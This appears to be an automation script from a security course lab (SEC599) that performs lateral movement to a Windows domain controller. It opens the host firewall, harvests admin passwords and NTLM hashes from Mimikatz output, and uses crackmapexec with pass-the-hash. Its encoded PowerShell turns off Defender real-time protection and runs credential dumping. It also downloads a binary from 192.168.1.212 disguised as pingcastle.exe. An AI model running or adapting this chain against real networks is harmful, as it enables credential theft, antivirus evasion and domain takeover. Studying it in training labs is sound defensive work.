#!/bin/bash
# SEC599 - DtF Script - Step 6 - Move laterally to DC

echo "Clearing firewall rules (allow all inbound)"
echo "-------------------------------------------"
iptables -F && echo "OK - iptables flushed"
iptables -I INPUT -j ACCEPT && echo "OK - all inbound allowed"
echo "Done"

echo "Searching for domain admin passwords or hashes"
echo "----------------------------------------------"

while read c; do
  ip=$(grep "^$c" /root/Desktop/CTF/output/3-metsessions_ip-initial | awk -F ' ' '{print $2}')
  
  # Making sure Mimikatz output file is clean
  rm -rf /root/Desktop/CTF/output/6-temp_mimikatz_output-initial

  awk "/Session $c - IP address $ip/,/Removing portforward to Session $c/" /root/Desktop/CTF/results/*initialattack.result > /root/Desktop/CTF/output/6-temp_mimikatz_output-initial

  administratorpwd=""
  administratorhash=""
  alanmarshalldadmpwd=""
  alanmarshalldadmhash=""

  administratorpwd=$(grep -v "null" /root/Desktop/CTF/output/6-temp_mimikatz_output-initial | grep -v "WINDOWS02" | grep -v "WINDOWS01" | grep -i -A2 "Username : Administrator" | grep -m1  "Password" | awk -F ':' '{print $3}' | xargs | strings)
  administratorhash=$(grep -v "null" /root/Desktop/CTF/output/6-temp_mimikatz_output-initial | grep -v "WINDOWS02" | grep -v "WINDOWS01" | grep -i -A2 "Username : Administrator" | grep -m1 "NTLM" | awk -F ':' '{print $3}' | xargs | strings)
  alanmarshalldadmpwd=$(grep -v "null" /root/Desktop/CTF/output/6-temp_mimikatz_output-initial | grep -i -A2 "Username : alan.marshall.dadm" | grep -m1 "Password" | awk -F ':' '{print $3}' | xargs | strings)
  alanmarshalldadmhash=$(grep -v "null" /root/Desktop/CTF/output/6-temp_mimikatz_output-initial | grep -i -A2 "Username : alan.marshall.dadm" | grep -m1 "NTLM" | awk -F ':' '{print $3}' | xargs | strings)

  echo "Setting up portforward to session $c - IP address $ip"
  echo "-----------------------------------------------------"
  cp /root/Desktop/CTF/6-portforwardtemplate /root/Desktop/CTF/6-portforward.rc
  sed -i "s/TEMPLATE/$c/g" /root/Desktop/CTF/6-portforward.rc
  echo "resource /root/Desktop/CTF/6-portforward.rc" | nc 127.0.0.1 55554

if [ "$administratorpwd" != "" ]
then
   echo ""
   echo "Use identified domain admin 'Administrator' account against DC on $ip (using password '$administratorpwd')"
   echo "----------------------------------------------------------------------------------------------------------"
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u Administrator -p $administratorpwd -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA='
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u Administrator -p $administratorpwd -x 'bitsadmin /transfer debjob /download /priority normal http://192.168.1.212:8080/svchost.exe C:\\Users\\Administrator\\Downloads\\pingcastle.exe'
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u Administrator -p $administratorpwd -x 'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHAAaQBuAGcAYwBhAHMAdABsAGUALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u Administrator -p $administratorpwd -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAZgBhAGwAcwBlAA=='

elif [ "$administratorhash" != "" ]
then 
   echo ""
   echo "Use identified domain admin 'Administrator' account against DC on $ip (using hash '$administratorhash')"
   echo "-------------------------------------------------------------------------------------------------------"
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u Administrator -p $administratorhash -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA='
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u Administrator -H $administratorhash -x 'bitsadmin /transfer debjob /download /priority normal http://192.168.1.212:8080/svchost.exe C:\\Users\\Administrator\\Downloads\\pingcastle.exe'
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u Administrator -H $administratorhash -x 'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHAAaQBuAGcAYwBhAHMAdABsAGUALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u Administrator -p $administratorhash -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAZgBhAGwAcwBlAA=='

elif [ "$alanmarshalldadmpwd" != "" ]
then 
   echo ""
   echo "Use identified domain admin 'alan.marshall.dadm' account against DC on $ip (using password '$alanmarshalldadmpwd')"
   echo "------------------------------------------------------------------------------------------------------------------"
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u alan.marshall.dadm -p $alanmarshalldadmpwd -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA='
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u alan.marshall.dadm -p $alanmarshalldadmpwd -x 'bitsadmin /transfer debjob /download /priority normal http://192.168.1.212:8080/svchost.exe C:\\Users\\Administrator\\Downloads\\pingcastle.exe'
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u alan.marshall.dadm -p $alanmarshalldadmpwd -x 'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHAAaQBuAGcAYwBhAHMAdABsAGUALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u alan.marshall.dadm -p $alanmarshalldadmpwd -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAZgBhAGwAcwBlAA=='

elif [ "$alanmarshalldadmhash" != "" ]
then 
   echo ""
   echo "Use identified domain admin 'alan.marshall.dadm' account against DC on $ip (using hash '$alanmarshalldadmhash')"
   echo "---------------------------------------------------------------------------------------------------------------"
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u alan.marshall.dadm -p $alanmarshalldadmhash -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA='
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u alan.marshall.dadm -H $alanmarshalldadmhash -x 'bitsadmin /transfer debjob /download /priority normal http://192.168.1.212:8080/svchost.exe C:\\Users\\Administrator\\Downloads\\pingcastle.exe'
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u alan.marshall.dadm -H $alanmarshalldadmhash -x 'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHAAaQBuAGcAYwBhAHMAdABsAGUALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='
   /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u alan.marshall.dadm -H $alanmarshalldadmhash -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAZgBhAGwAcwBlAA=='
else
   echo ""
   echo "No domain admin credentials found..."
fi
  echo "Removing portforward to session $c - IP address $ip"
  echo "---------------------------------------------------"
  cp /root/Desktop/CTF/6-stopportforwardtemplate /root/Desktop/CTF/6-stopportforward.rc
  sed -i "s/TEMPLATE/$c/g" /root/Desktop/CTF/6-stopportforward.rc
  echo "resource /root/Desktop/CTF/6-stopportforward.rc" | nc 127.0.0.1 55554
done </root/Desktop/CTF/output/2-cms_sessions-initial
